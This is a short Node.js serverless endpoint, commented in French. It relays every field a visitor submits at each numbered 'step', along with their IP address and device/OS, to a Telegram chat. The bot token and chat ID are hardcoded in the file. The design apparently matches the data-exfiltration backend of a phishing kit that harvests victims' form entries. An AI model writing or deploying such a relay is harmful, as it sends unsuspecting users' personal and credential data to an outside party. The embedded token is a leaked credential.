// api/tg.js
// ----------------------------------------------------------------------------------
// ATTENTION : pour des raisons de sécurité on recommande d'utiliser des variables
// d'environnement. Ici, on hardcode directement vos identifiants Telegram.
// ----------------------------------------------------------------------------------

const fetch = global.fetch || require('node-fetch');

// Remplacez ci-dessous par VOTRE token et VOTRE chat ID
const BOT_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID   = '-4766781392';

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Détecte OS et device depuis le user-agent
function parseUA(ua) {
  const isAndroid = /Android/i.test(ua);
  const isIPhone  = /iPhone/i.test(ua);
  const isWindows = /Windows NT/i.test(ua);
  const isMac     = /Macintosh/i.test(ua);
  let os = 'Inconnu';
  if (isAndroid) os = 'Android';
  else if (isIPhone) os = 'iPhone';
  else if (isWindows) os = 'Windows';
  else if (isMac) os = 'Mac OS';
  const device = isAndroid||isIPhone ? 'Mobile' : 'Desktop';
  return { os, device };
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).end('Méthode non autorisée');
  }

  // Récupère l'IP et le user-agent
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const { os, device } = parseUA(ua);

  const data = req.body;  
  const when = new Date().toLocaleString('fr-FR');

  // Construction du message
  let text = `🆕 *Nouvelle action client*\n`;
  text += `\`${when}\` depuis _${ip}_ (${device}/${os})\n\n`;
  text += `*Étape* : ${data.step}\n`;
  for (const [key, val] of Object.entries(data)) {
    if (key === 'step') continue;
    text += `• *${key}* : ${val}\n`;
  }

  try {
    // Envoi à Telegram
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: 'Markdown',
        text
      })
    });
    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Erreur Telegram:', err);
    return res.status(500).json({ error: 'Échec envoi Telegram' });
  }
};